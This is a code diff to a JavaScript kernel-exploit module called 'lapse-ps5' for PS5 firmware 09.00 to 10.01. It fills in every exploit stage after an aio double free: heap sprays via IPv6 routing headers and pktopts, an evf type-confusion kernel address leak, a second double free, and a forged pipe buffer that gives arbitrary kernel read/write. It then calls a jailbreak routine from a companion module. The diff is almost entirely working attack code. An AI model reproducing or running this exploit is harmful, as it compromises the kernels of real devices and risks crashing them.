@@ -3,11 +3,12 @@
  *
  * WHAT THIS IS
  * ------------
- * A THIRD kernel bug, unrelated to the other two the kit carries:
+ * A THIRD kernel bug. The three partition the firmware range exactly — every
+ * supported console belongs to one and only one of them:
  *
- *   netctrl  netcontrol UAF     09.00 - 12.00   seconds
- *   p2jb     cr_refcnt overflow 12.02 - 12.70   ~50 minutes
  *   lapse    aio double free    09.00 - 10.01   seconds   <- this file
+ *   netctrl  netcontrol UAF     10.20 - 12.00   seconds
+ *   p2jb     cr_refcnt overflow 12.02 - 12.70   ~50 minutes
  *
  * FIRMWARE RANGE — READ THIS BEFORE USING IT
  * ------------------------------------------
@@ -37,12 +38,18 @@
  *
  * SCOPE
  * -----
- * Implemented and self-contained here: the syscall layer, the request builder,
- * the aio spray/process helpers, the race thread, and double_free_reqs2 — the
- * novel part, i.e. everything up to and including a double-freed aio_entry.
- * The stages after it (leak_kaddrs, double_free_reqs1, the pktopts-twins
- * make_karw) are NOT written yet; run() stops with an explicit message rather
- * than pretending. Nothing here has been run on hardware.
+ * Complete: double_free_reqs2 (the SO_LINGER race), find_rthdr_twins,
+ * leak_kaddrs (evf type-confusion leak + reqs2 + target_id), double_free_reqs1
+ * (the 0x100-zone free), make_pktopts_twins, and make_karw — which ends by
+ * forging a pipebuf through the pktopts primitive.
+ *
+ * From there it HANDS OFF to netctrl-ps5.js: the pipe pair it builds is the
+ * same primitive that module's KRW already drives, and allproc / jailbreak /
+ * elfldr above it are route-independent. Duplicating them would mean two copies
+ * of the code that writes kernel memory, which is the last thing worth forking.
+ *
+ * NONE of this has run on hardware. The only stage with any console evidence is
+ * double_free_reqs2, and that evidence is two failures.
  */
 "use strict";
 
@@ -117,6 +124,7 @@ const wr64 = (a, o, v) => window.write64(BigInt(a) + BigInt(o), BigInt(v));
 const rd64 = (a, o) => BigInt(window.read64(BigInt(a) + BigInt(o)));
 const wr32 = (a, o, v) => window.write32(BigInt(a) + BigInt(o), Number(v) >>> 0);
 const rd32 = (a, o) => Number(window.read32(BigInt(a) + BigInt(o))) >>> 0;
+const wr8b = (a, o, v) => window.write8(BigInt(a) + BigInt(o), Number(v) & 0xff);
 function bzero(a, n) { for (let i = 0; i < n; i += 8) wr64(a, i, 0n); }
 
 let G = null;                       // absolute gadget addresses
@@ -434,6 +442,440 @@ function double_free_reqs2() {
                     + " attempts");
 }
 
+/* ---------------------------------------------------------- rthdr layer */
+
+const AF_INET6 = 28, SOCK_DGRAM = 2;
+const IPPROTO_IPV6 = 41;
+const IPV6_2292PKTOPTIONS = 25, IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;
+const IPV6_RTHDR = 51, IPV6_TCLASS = 61;
+const IPV6_SOCK_NUM = 0x80, HANDLES_NUM = 0x100;
+const FILEDESCENT_SIZE = 0x30n, PAGE_SIZE = 0x4000;
+const AIO_CMD_WRITE = 2;
+
+/* ip6_rthdr0: nxt(1) len(1) type(1) segleft(1) reserved(4). The kernel
+ * allocates (len+1)*8 bytes for it and len must be even — that is the whole
+ * mechanism for choosing which malloc zone a spray lands in. */
+function build_rthdr(addr, size) {
+    const len = ((size >> 3) - 1) & ~1;
+    wr32(addr, 0x00, ((len << 8) | ((len >> 1) << 24)) >>> 0);
+    return (len + 1) << 3;
+}
+function set_rthdr(sock) {
+    return sc("setsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR),
+              ST.spray, S(ST.sprayLen));
+}
+function free_rthdr(sock) {
+    return sc("setsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR), 0n, 0n);
+}
+function get_rthdr(sock, size) {
+    wr32(ST.lenp, 0x00, size);
+    sc("getsockopt", S(sock), S(IPPROTO_IPV6), S(IPV6_RTHDR),
+       ST.leak, ST.lenp);
+    return rd32(ST.lenp, 0x00);
+}
+function make_socket(af, type) {
+    const s = sc("socket", S(af), S(type), 0n);
+    if (s < 0) throw new Error("lapse: socket(" + af + "," + type + ") -> " + s);
+    return s;
+}
+
+/* --------------------------------------------------------- reqs2 verify */
+
+/* Kernel heap pointers are 0xffff_XXXX_..., where XXXX is randomised per boot.
+ * A genuine aio_entry's pointers must therefore SHARE that prefix, which is a
+ * much stronger test than "looks canonical" and is what stops a half-reclaimed
+ * chunk being mistaken for the real thing. */
+function verify_reqs2(a) {
+    const pref = [];
+    const want = (v) => {
+        if ((v >> 0x30n) !== 0xffffn) return false;
+        pref.push((v >> 0x20n) & 0xffffn);
+        return true;
+    };
+    if (rd32(a, 0x00) !== AIO_CMD_WRITE) return false;
+    if (!want(rd64(a, 0x10))) return false;          // ar2_reqs1
+    if (!want(rd64(a, 0x18))) return false;          // ar2_info
+    if (!want(rd64(a, 0x20))) return false;          // ar2_batch
+    const state = rd32(a, 0x38);
+    if (state <= 0 || state > AIO_STATE_ABORTED) return false;
+    if (rd32(a, 0x3c) !== 0) return false;           // ar2_result._pad
+    if (rd64(a, 0x40) !== 0n) return false;          // ar2_file: the fd was -1
+    const unk2 = rd64(a, 0x48);
+    if (unk2 !== 0n && !want(unk2)) return false;
+    if (!want(rd64(a, 0x50))) return false;          // ar2_qentry
+    return pref.every((v) => v === pref[0]);
+}
+
+/* ----------------------------------------------------------- twin hunts */
+
+function find_rthdr_twins() {
+    for (let i = 0; i < ATTEMPT_NUM; i++) {
+        for (let j = 0; j < ST.socks.length; j++) {
+            wr32(ST.spray, 0x04, j);                 // ip6r0_reserved = index
+            set_rthdr(ST.socks[j]);
+        }
+        for (let j = 0; j < ST.socks.length; j++) {
+            get_rthdr(ST.socks[j], 8);
+            const idx = rd32(ST.leak, 0x04);
+            if (idx !== j && idx < ST.socks.length) {
+                ST.rthdr_twins = [ST.socks[j], ST.socks[idx]];
+                const hi = Math.max(j, idx), lo = Math.min(j, idx);
+                ST.socks.splice(hi, 1); ST.socks.splice(lo, 1);
+                for (const s of ST.socks) free_rthdr(s);
+                ST.socks.push(make_socket(AF_INET6, SOCK_DGRAM),
+                              make_socket(AF_INET6, SOCK_DGRAM));
+                log("rthdr twins " + ST.rthdr_twins.join("/")
+                    + " after " + i + " rounds");
+                return true;
+            }
+        }
+    }
+    throw new Error("lapse: no rthdr twins in " + ATTEMPT_NUM + " rounds");
+}
+
+function make_pktopts_twins() {
+    const tc = alloc(4), tcl = alloc(4);
+    for (let i = 0; i < ATTEMPT_NUM; i++) {
+        // drop every pktopts, then rebuild them tagged with their index
+        for (const s of ST.socks)
+            sc("setsockopt", S(s), S(IPPROTO_IPV6), S(IPV6_2292PKTOPTIONS), 0n, 0n);
+        for (let j = 0; j < ST.socks.length; j++) {
+            wr32(tc, 0x00, j);
+            sc("setsockopt", S(ST.socks[j]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
+               BigInt(tc), S(4));
+        }
+        for (let j = 0; j < ST.socks.length; j++) {
+            wr32(tcl, 0x00, 4);
+            sc("getsockopt", S(ST.socks[j]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
+               BigInt(tc), BigInt(tcl));
+            const idx = rd32(tc, 0x00);
+            if (idx !== j && idx < ST.socks.length) {
+                ST.pktopts_twins = [ST.socks[j], ST.socks[idx]];
+                const hi = Math.max(j, idx), lo = Math.min(j, idx);
+                ST.socks.splice(hi, 1); ST.socks.splice(lo, 1);
+                /* Replace them AND give the replacements a pktopts right away,
+                 * while the double-freed chunk is still claimed. Leaving that
+                 * gap open is how an unrelated allocation steals it. */
+                for (let k = 0; k < 2; k++) {
+                    const s = make_socket(AF_INET6, SOCK_DGRAM);
+                    sc("setsockopt", S(s), S(IPPROTO_IPV6), S(IPV6_TCLASS),
+                       BigInt(tc), S(4));
+                    ST.socks.push(s);
+                }
+                log("pktopts twins " + ST.pktopts_twins.join("/")
+                    + " after " + i + " rounds");
+                return true;
+            }
+        }
+    }
+    throw new Error("lapse: could not make pktopts twins");
+}
+
+/* --------------------------------------------------------- leak_kaddrs */
+
+function leak_kaddrs() {
+    sc("close", S(ST.rthdr_twins[1]));
+
+    /* Type-confuse a struct evf with the ip6_rthdr. The evf's flags field
+     * overlaps ip6r0_len, so a flags value >= 0xf00 makes getsockopt hand back
+     * the whole 0x80 chunk. That is the leak primitive. */
+    const name = alloc(8); wr64(name, 0, 0n);
+    let evf = 0, leaked = false;
+    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
+        const evfs = [];
+        for (let j = 0; j < HANDLES_NUM; j++)
+            evfs.push(sc("evf_create", BigInt(name), 0n,
+                         S(((j << 0x10) | 0xf00) >>> 0)));
+        get_rthdr(ST.rthdr_twins[0], 0x80);
+        const marker = rd32(ST.leak, 0x00);
+        if ((marker & 0xffff) === 0xf00) {
+            const idx = marker >>> 0x10;
+            evf = evfs[idx];
+            sc("evf_clear", S(evf), 0n);
+            sc("evf_set", S(evf), S((marker | 1) >>> 0));
+            get_rthdr(ST.rthdr_twins[0], 0x80);
+            const m2 = rd32(ST.leak, 0x00);
+            if ((m2 & 0xffff) === ((marker & 0xffff) | 1) && (m2 >>> 0x10) === idx) {
+                leaked = true;
+                evfs.splice(idx, 1);
+                log("leaked evf handle " + hex(evf) + " after " + i + " rounds");
+            }
+        }
+        for (const e of evfs) sc("evf_delete", S(e));
+    }
+    if (!leaked) throw new Error("lapse: could not leak an evf");
+
+    ST.evf = evf;
+    // evf.cv.cv_description points at the string "evf cv" in the kernel image
+    ST.evf_cv = rd64(ST.leak, 0x28);
+    /* TAILQ_INIT leaves evf.waiters.tqh_last == &evf.waiters.tqh_first, so the
+     * chunk's own address falls straight out of the leak. */
+    ST.reqs2_addr = rd64(ST.leak, 0x40) - 0x38n;
+    log("evf_cv=" + hex(ST.evf_cv) + " reqs2=" + hex(ST.reqs2_addr));
+
+    // widen the OOB read to 0x800 by driving ip6r0_len through the evf flags
+    sc("evf_clear", S(ST.evf), 0n);
+    sc("evf_set", S(ST.evf), S(0xff << 8));
+
+    /* reqs1 doubles as two forged structures:
+     *   .buf  -> reqs2+4, so a later crfree(ai_cred) harmlessly decrements
+     *            ar2_ticket instead of touching a real credential
+     *   +0x28 -> a fake aio_batch that already looks complete and unlocked */
+    const NUM6 = 6;                       // 6 * 0x28 = 0xF0 -> the 0x100 zone
+    build_reqs1(NUM6, -1);
+    wr64(ST.reqs1, 0x10, ST.reqs2_addr + 4n);
+    const b = ST.reqs1 + 0x28n;
+    wr32(b, 0x00, 1);                     // ar3_num_reqs
+    wr32(b, 0x04, 0);                     // ar3_reqs_left
+    wr32(b, 0x08, AIO_STATE_COMPLETE);
+    wr32(b, 0x0c, 0);                     // ar3_done
+    wr32(b, 0x28, 0x67b0000);             // ar3_lock.lock_object.lo_flags
+    wr64(b, 0x38, 1n);                    // ar3_lock.lk_lock = LK_UNLOCKED
+
+    const N6 = HANDLES_NUM * NUM6;
+    const leakIds = alloc(4 * N6);
+    bzero(leakIds, 4 * N6);
+
+    let idx2 = -1;
+    leaked = false;
+    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
+        spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, NUM6, leakIds, N6);
+        get_rthdr(ST.rthdr_twins[0], 0x800);
+        for (let j = 1; j < 0x10; j++) {
+            if (verify_reqs2(ST.leak + BigInt(j * 0x80))) {
+                idx2 = j; leaked = true;
+                log("reqs2 at leak index " + j + " after " + i + " rounds");
+                break;
+            }
+        }
+        if (!leaked)
+            process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, leakIds, 0, N6);
+    }
+    if (!leaked) throw new Error("lapse: could not leak reqs2");
+
+    const r2 = ST.leak + BigInt(idx2 * 0x80);
+    ST.reqs2_leak_off = idx2 * 0x80;
+    // reqs1 came from the 0x100 zone, so it is 0x100-aligned
+    ST.reqs1_addr = rd64(r2, 0x10) & ~0xffn;
+    ST.aio_info_addr = rd64(r2, 0x18);
+    log("reqs1=" + hex(ST.reqs1_addr) + " aio_info=" + hex(ST.aio_info_addr));
+
+    /* Work out which sprayed id owns the entry we can see: cancel one batch at
+     * a time and watch for OUR entry's state flipping to ABORTED. */
+    let found = false, rest = 0;
+    for (let batch = 0; batch < N6; batch += NUM6) {
+        process_aio(AIO_OP_CANCEL, leakIds, batch, NUM6);
+        get_rthdr(ST.rthdr_twins[0], 0x800);
+        if (rd32(ST.leak + BigInt(ST.reqs2_leak_off), 0x38) === AIO_STATE_ABORTED) {
+            ST.target_id = rd32(leakIds, batch * 4);
+            wr32(leakIds, batch * 4, 0);          // keep it out of the cleanup
+            rest = batch + NUM6; found = true;
+            log("target_id=" + hex(ST.target_id) + " at batch " + (batch / NUM6));
+            break;
+        }
+    }
+    if (!found) throw new Error("lapse: could not find target_id");
+
+    process_aio(AIO_OP_CANCEL, leakIds, rest, N6 - rest);
+    process_aio(AIO_OP_POLL | AIO_OP_DELETE, leakIds, 0, N6);
+}
+
+/* ---------------------------------------------------- double_free_reqs1 */
+
+function double_free_reqs1() {
+    const NB = 2, TOTAL = AIO_MAX_NUM * NB;
+    const ids = alloc(4 * TOTAL);
+    bzero(ids, 4 * TOTAL);
+    build_reqs1(AIO_MAX_NUM, -1);
+
+    sc("evf_delete", S(ST.evf));
+
+    // wait until an AIO queue entry lands in the freed chunk
+    let leaked = false;
+    for (let i = 0; i < ATTEMPT_NUM && !leaked; i++) {
+        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, ids, TOTAL);
+        const len = get_rthdr(ST.rthdr_twins[0], 0x800);
+        if (len === 8 && rd32(ST.leak, 0x00) === AIO_CMD_READ) {
+            leaked = true;
+            process_aio(AIO_OP_CANCEL, ids, 0, TOTAL);
+            log("leaked AIO queue entry after " + i + " rounds");
+            break;
+        }
+        process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, ids, 0, TOTAL);
+    }
+    if (!leaked) throw new Error("lapse: could not leak an AIO queue entry");
+
+    /* Forge an aio_entry whose ar2_info / ar2_batch point into our own reqs1,
+     * so deleting it frees a chunk another id also owns. */
+    bzero(ST.spray, 0x100);
+    ST.sprayLen = build_rthdr(ST.spray, 0x80);
+    wr32(ST.spray, 0x04, 5);                       // ar2_ticket
+    wr64(ST.spray, 0x18, ST.reqs1_addr);           // ar2_info
+    wr64(ST.spray, 0x20, ST.reqs1_addr + 0x28n);   // ar2_batch
+
+    sc("close", S(ST.rthdr_twins[0]));
+    ST.rthdr_twins = [0, 0];
+
+    let reqId = 0, over = false;
+    for (let i = 0; i < ATTEMPT_NUM && !over; i++) {
+        for (const s of ST.socks) set_rthdr(s);
+        for (let batch = 0; batch < TOTAL && !over; batch += AIO_MAX_NUM) {
+            for (let k = 0; k < AIO_MAX_NUM; k++) wr32(ST.outs, k * 4, 0xffffffff);
+            process_aio(AIO_OP_CANCEL, ids, batch, AIO_MAX_NUM);
+            for (let k = 0; k < AIO_MAX_NUM; k++) {
+                if (rd32(ST.outs, k * 4) === AIO_STATE_COMPLETE) {
+                    reqId = rd32(ids, (batch + k) * 4);
+                    wr32(ids, (batch + k) * 4, 0);
+                    over = true;
+                    log("overwrote crafted entry: req_id=" + hex(reqId)
+                        + " after " + i + " rounds");
+                    break;
+                }
+            }
+        }
+    }
+    if (!over) throw new Error("lapse: could not overwrite the crafted AIO entry");
+
+    process_aio(AIO_OP_POLL | AIO_OP_DELETE, ids, 0, TOTAL);
+
+    const pair = alloc(8);
+    wr32(pair, 0x00, reqId);
+    wr32(pair, 0x04, ST.target_id);
+    process_aio(AIO_OP_POLL, pair, 0, 2);          // makes them deletable
+
+    /* THE SECOND DOUBLE FREE, on the 0x100 zone: target_id's reqs1 and
+     * req_id's ar2_info are the same address, so deleting both frees it twice.
+     * Reclaim IMMEDIATELY — the validation below is slow, and anything else on
+     * the system could take the chunk while we are checking. */
+    process_aio(AIO_OP_DELETE, pair, 0, 2);
+    const e0 = rd32(ST.outs, 0x00), e1 = rd32(ST.outs, 0x04);
+
+    let err = null;
+    try {
+        make_pktopts_twins();
+        find_rthdr_twins();
+    } catch (e) { err = e; }
+
+    process_aio(AIO_OP_POLL, pair, 0, 2);
+    const s0 = rd32(ST.outs, 0x00);
+    log("pair delete errs=" + hex(e0) + "/" + hex(e1) + " status0=" + hex(s0));
+    if (err) throw err;
+    if (s0 !== SCE_KERNEL_ERROR_ESRCH)
+        throw new Error("lapse: bad delete of the corrupt AIO request (status "
+                        + hex(s0) + ")");
+    if (e0 !== 0 || e1 !== 0)
+        throw new Error("lapse: bad delete of the id pair (" + hex(e0) + "/"
+                        + hex(e1) + ")");
+}
+
+/* ----------------------------------------------------------- kernel R/W */
+
+function make_karw() {
+    bzero(ST.spray, 0x100);
+    ST.sprayLen = build_rthdr(ST.spray, 0x100);
+
+    const pktinfoAddr = ST.reqs1_addr + 0x10n;
+    /* pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo — the self-pointer that
+     * turns IPV6_PKTINFO into a write primitive aimed at the pktopts itself. */
+    wr64(ST.spray, 0x10, pktinfoAddr);
+
+    sc("close", S(ST.pktopts_twins[1]));
+
+    const tc = alloc(4), tcl = alloc(4);
+    let over = false;
+    for (let i = 0; i < ATTEMPT_NUM && !over; i++) {
+        for (let j = 0; j < ST.socks.length; j++) {
+            wr32(ST.spray, 0xc0, ((j << 0x10) | 0x1337) >>> 0);
+            set_rthdr(ST.socks[j]);
+        }
+        wr32(tcl, 0x00, 4);
+        sc("getsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_TCLASS),
+           BigInt(tc), BigInt(tcl));
+        const marker = rd32(tc, 0x00);
+        if ((marker & 0xffff) === 0x1337) {
+            const idx = marker >>> 0x10;
+            if (idx < ST.socks.length) {
+                ST.pktopts_twins[1] = ST.socks[idx];
+                ST.socks.splice(idx, 1);
+                over = true;
+                log("overwrote pktopts of " + ST.pktopts_twins[0] + " with sock "
+                    + ST.pktopts_twins[1] + " after " + i + " rounds");
+            }
+        }
+    }
+    if (!over) throw new Error("lapse: could not overwrite the pktopts");
+
+    const pktinfo = alloc(0x14), nhop = alloc(4), buf = alloc(8);
+
+    /* 8-byte kernel read via IPV6_NEXTHOP.
+     *
+     * ip6po_nexthop is handed back as a sockaddr whose LENGTH is the first byte
+     * at the target address, so a read stops early whenever it meets a zero.
+     * Loop until all 8 bytes are covered, writing a 0 wherever the kernel
+     * returned nothing — that is how a NUL inside the qword is recovered. */
+    function kread8(addr) {
+        if (addr === 0n) throw new Error("lapse: kread8(0)");
+        wr64(buf, 0, 0n);
+        let off = 0;
+        while (off < 8) {
+            wr64(pktinfo, 0x00, pktinfoAddr);
+            wr64(pktinfo, 0x08, addr + BigInt(off));
+            sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6),
+               S(IPV6_PKTINFO), BigInt(pktinfo), S(0x14));
+            wr32(nhop, 0x00, 8 - off);
+            sc("getsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6),
+               S(IPV6_NEXTHOP), BigInt(buf) + BigInt(off), BigInt(nhop));
+            const n = rd32(nhop, 0x00);
+            if (n === 0) { wr8b(buf, off, 0); off += 1; } else { off += n; }
+        }
+        return rd64(buf, 0);
+    }
+    ST.kread8 = kread8;
+
+    // Prove it before trusting it: evf.cv.cv_description is the string "evf cv"
+    const probe = kread8(ST.evf_cv);
+    let s = "";
+    for (let i = 0; i < 6; i++)
+        s += String.fromCharCode(Number((probe >> BigInt(i * 8)) & 0xffn));
+    log("kread8(evf_cv) = " + JSON.stringify(s));
+    if (s !== "evf cv")
+        throw new Error("lapse: kread8 self-test failed, got " + JSON.stringify(s));
+
+    const p = kread8(ST.aio_info_addr + 8n);
+    if ((p & 0xffff000000000000n) !== 0xffff000000000000n)
+        throw new Error("lapse: curproc " + hex(p) + " is not a kernel address");
+    ST.curproc = p;
+    log("curproc=" + hex(p) + " pid=" + Number(kread8(p + 0xbcn) & 0xffffffffn));
+
+    const p_fd = kread8(p + 0x48n);
+    ST.fdt_ofiles = kread8(p_fd) + 8n;
+    log("fdt_ofiles=" + hex(ST.fdt_ofiles));
+
+    const mfp = kread8(ST.fdt_ofiles + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE);
+    const sfp = kread8(ST.fdt_ofiles + BigInt(ST.slave_pipe[0]) * FILEDESCENT_SIZE);
+    const mdata = kread8(mfp), sdata = kread8(sfp);
+    log("master f_data=" + hex(mdata) + " slave f_data=" + hex(sdata));
+
+    /* Aim the pktopts at the master pipe's pipe_buffer, then write a pipebuf
+     * whose .buffer is the SLAVE pipe's struct. From here on, writing the
+     * master pipe rewrites the slave's buffer pointer, and reading/writing the
+     * slave moves data to or from any kernel address — the same pipe primitive
+     * netctrl-ps5.js already drives, which is what makes the handoff possible. */
+    bzero(pktinfo, 0x14);
+    wr64(pktinfo, 0x00, mdata + 8n);      // &pipe->pipe_buffer.out
+    wr64(pktinfo, 0x08, 0n);
+    sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_PKTINFO),
+       BigInt(pktinfo), S(0x14));
+
+    wr32(pktinfo, 0x00, 0);               // pipebuf.out
+    wr32(pktinfo, 0x04, PAGE_SIZE);       // pipebuf.size
+    wr64(pktinfo, 0x08, sdata);           // pipebuf.buffer
+    sc("setsockopt", S(ST.pktopts_twins[0]), S(IPPROTO_IPV6), S(IPV6_PKTINFO),
+       BigInt(pktinfo), S(0x14));
+
+    log("kernel R/W established");
+}
+
 /* ----------------------------------------------------------------- init */
 
 function init() {
@@ -441,11 +883,29 @@ function init() {
     ST.ids   = BigInt(alloc(4 * AIO_MAX_NUM));
     ST.outs  = BigInt(alloc(4 * AIO_MAX_NUM));
     ST.tmp   = BigInt(alloc(0x100));
+    ST.spray = BigInt(alloc(0x100));
+    ST.leak  = BigInt(alloc(0x800));
+    ST.lenp  = BigInt(alloc(4));
     bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
     bzero(ST.ids, 4 * AIO_MAX_NUM);
     bzero(ST.outs, 4 * AIO_MAX_NUM);
+    bzero(ST.spray, 0x100);
+    bzero(ST.leak, 0x800);
+    ST.sprayLen = build_rthdr(ST.spray, 0x80);
+
+    const pb = alloc(8);
+    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(master)");
+    ST.master_pipe = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
+    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(slave)");
+    ST.slave_pipe = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
+
+    ST.socks = [];
+    for (let i = 0; i < IPV6_SOCK_NUM; i++)
+        ST.socks.push(make_socket(AF_INET6, SOCK_DGRAM));
+
     gadgets();
-    log("init ok reqs1=" + hex(ST.reqs1) + " ids=" + hex(ST.ids));
+    log("init ok reqs1=" + hex(ST.reqs1) + " socks=" + ST.socks.length
+        + " pipes=" + ST.master_pipe.join("/") + " " + ST.slave_pipe.join("/"));
 }
 
 const LAPSE_FIRMWARES = new Set(["09.00", "09.20", "09.40", "09.60",
@@ -461,26 +921,54 @@ function run() {
         return false;
     }
 
+    /* Mark the kernel dirty BEFORE the first free. Everything from here on
+     * leaves a chunk on the free list twice; re-arming on that state without a
+     * reboot is what turns a clean failure into a panic. */
+    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}
+
     init();
     const won = double_free_reqs2();
-    log("double_free_reqs2 won on attempt " + won.attempt);
+    log("aio double free won on attempt " + won.attempt);
+    find_rthdr_twins();
 
-    /* Deliberately stops here rather than pretending.
-     *
-     * What remains, in cobolt's order: leak_kaddrs (reclaim the freed entry
-     * with an rthdr spray and read the kernel pointers out of it),
-     * double_free_reqs1, then make_karw via pktopts twins. The last of those
-     * maps closely onto machinery netctrl-ps5.js already has (find_twins /
-     * find_triplet / the pipe-based KRW), so it is the leak stage that is the
-     * real remaining work, not the R/W. */
-    throw new Error("lapse: double free achieved; leak_kaddrs / "
-                    + "double_free_reqs1 / make_karw are not implemented yet");
+    leak_kaddrs();
+    double_free_reqs1();
+    make_karw();
+
+    /* Hand off to netctrl-ps5.js. Its KRW is the pipe primitive we just built,
+     * and allproc / jailbreak / elfldr above it are route-independent, so there
+     * is nothing lapse-specific left to do. */
+    const N = window.netctrl_ps5;
+    if (!N) throw new Error("lapse: netctrl_ps5 not loaded for the handoff");
+    N.ST.master_pipe = ST.master_pipe;
+    N.ST.victim_pipe = ST.slave_pipe;
+    N.ST.fdt_ofiles = ST.fdt_ofiles;
+    N.ST.curproc = ST.curproc;
+    log("handoff curproc=" + hex(ST.curproc) + " fdt=" + hex(ST.fdt_ofiles));
+
+    /* Cross-check the pipe KRW against the pktopts reader before anything
+     * writes through it. They are independent primitives, so agreement on one
+     * qword is strong evidence the forged pipebuf landed correctly. */
+    const viaPipe = N.KRW.r64(ST.curproc + 0x48n);
+    const viaPkt = ST.kread8(ST.curproc + 0x48n);
+    log("KRW cross-check pipe=" + hex(viaPipe) + " pktopts=" + hex(viaPkt));
+    if (viaPipe !== viaPkt)
+        throw new Error("lapse: pipe KRW disagrees with the pktopts read ("
+                        + hex(viaPipe) + " vs " + hex(viaPkt) + ")");
+
+    N.find_allproc();
+    N.ps5_jailbreak();
+    log("JAILBROKEN via lapse");
+    try { sessionStorage.removeItem("netctrl_dirty"); } catch (e) {}
+    return true;
 }
 
 window.lapse_ps5 = {
-    run, init, double_free_reqs2, build_reqs1, spray_aio, process_aio,
-    spawnDeleteRacer, verify_reqs2, ST, SYS, LAPSE_FIRMWARES,
-    version: "lapse-ps5 0.1 (double-free stage only)",
+    run, init, double_free_reqs2, leak_kaddrs, double_free_reqs1, make_karw,
+    find_rthdr_twins, make_pktopts_twins, build_reqs1, set_req_fd, spray_aio,
+    process_aio, spawnDeleteRacer, verify_reqs2, build_rthdr, set_rthdr,
+    get_rthdr, free_rthdr, ST, SYS, LAPSE_FIRMWARES,
+    version: "lapse-ps5 1.0",
 };
 log("loaded — " + window.lapse_ps5.version);
 
